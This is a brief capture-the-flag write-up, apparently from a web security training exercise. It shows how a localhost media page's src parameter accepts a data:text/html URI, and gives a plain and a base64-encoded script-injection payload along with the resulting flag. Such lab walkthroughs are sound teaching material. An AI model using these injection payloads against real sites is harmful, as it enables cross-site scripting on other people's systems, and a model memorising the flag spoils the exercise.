- We can click on the third image of index.php than shows us a new page: http://localhost:8888/?page=media&src=nsa
- In the source code we find this: <object data="http://10.0.10.15/images/nsa_prism.jpg"></object>
- THe page dynamically load a ressource (Here an image).
- The value data is derived from the src parameter and nsa is a key to the filename. If we modify the data parameter in the html source code we could inject javascriipt code. 
- To do so, we have specify a value for data like this:

```
?page=media&src=data:text/html,<script>alert(1)</script> (It works but it doesnt show us the flag so let's encode it in base64)

?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

- We got the flag: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
